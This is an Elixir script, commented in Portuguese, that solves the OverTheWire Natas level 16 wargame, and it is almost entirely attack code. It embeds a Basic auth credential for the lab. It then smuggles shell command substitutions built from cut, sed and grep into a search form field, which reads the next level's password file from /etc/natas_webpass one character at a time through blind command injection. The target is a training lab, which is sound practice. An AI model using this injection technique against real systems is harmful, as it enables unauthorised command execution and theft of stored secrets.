defmodule Natas16 do
  use Tesla

  plug(Tesla.Middleware.BaseUrl, "http://natas16.natas.labs.overthewire.org")

  plug(Tesla.Middleware.Headers,
    Authorization: "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
  )

  plug(Tesla.Middleware.FormUrlencoded)

  # 10 palavras utilizadas como referência para obter os números do password
  @numbers %{
    "Americans" => "0",
    "April" => "1",
    "April's" => "2",
    "Aprils" => "3",
    "Asian" => "4",
    "Asians" => "5",
    "August" => "6",
    "August's" => "7",
    "Augusts" => "8",
    "B" => "9"
  }

  def start, do: discover_password(1, "")

  def discover_password(char_index, current_password) do
    IO.puts("Password atual: #{current_password}\n")
    IO.puts("Testando o caracter número #{char_index}\n\n")

    char_index
    |> create_query_string
    |> format_search_field
    |> post_data
    |> parse_results
    |> get_response_char(char_index)
    |> check_case(current_password)
    |> update_password(char_index, current_password)
  end

  defp update_password(:password_found, _, password), do: print_password(password)

  defp update_password({[], char}, char_index, current_password),
    do: discover_password(char_index + 1, "#{current_password}#{String.upcase(char)}")

  defp update_password({_results, char}, char_index, current_password),
    do: discover_password(char_index + 1, "#{current_password}#{String.downcase(char)}")

  defp check_case(:password_found, _password), do: :password_found

  defp check_case(char, password) do
    case_results =
      create_query_string_for_case(char, password)
      |> format_search_field
      |> post_data
      |> parse_results

    {case_results, char}
  end

  defp format_search_field(command_to_run) do
    %{"needle" => command_to_run}
  end

  defp post_data(form_data) do
    post!("/index.php", form_data)
  end

  defp parse_results(%Tesla.Env{body: html_response}) do
    html_response
    |> Floki.parse_document!()
    |> Floki.find("div#content pre")
    |> Floki.text()
    |> String.split("\n")
    |> Enum.split(1)
    |> elem(1)
  end

  defp get_response_char([], char_index), do: get_number_in_password(char_index)

  defp get_response_char(["" | _list], _char_index), do: :password_found

  defp get_response_char([word | _list], _char_index) do
    String.at(word, 0)
  end

  defp get_response_number([word | _list]) do
    Map.get(@numbers, word)
  end

  defp get_number_in_password(char_index) do
    char_index
    |> create_query_string_for_numbers
    |> format_search_field()
    |> post_data()
    |> parse_results()
    |> get_response_number()
  end

  defp create_query_string(char_index),
    do: "^$(cut -c#{char_index}-#{char_index} /etc/natas_webpass/natas17)"

  defp create_query_string_for_numbers(char_index),
    do:
      "$(sed -n 1$(cut -c#{char_index}-#{char_index} /etc/natas_webpass/natas17)p dictionary.txt)"

  defp create_query_string_for_case(char, password),
    do: "$(grep ^#{password}#{String.upcase(char)} /etc/natas_webpass/natas17)"

  defp print_password(password) do
    IO.puts("**********************************")
    IO.puts("*      PASSWORD DESCOBERTO!      *")
    IO.puts("**********************************\n\n")

    IO.puts("O password do Natas17 é: " <> password)
  end
end
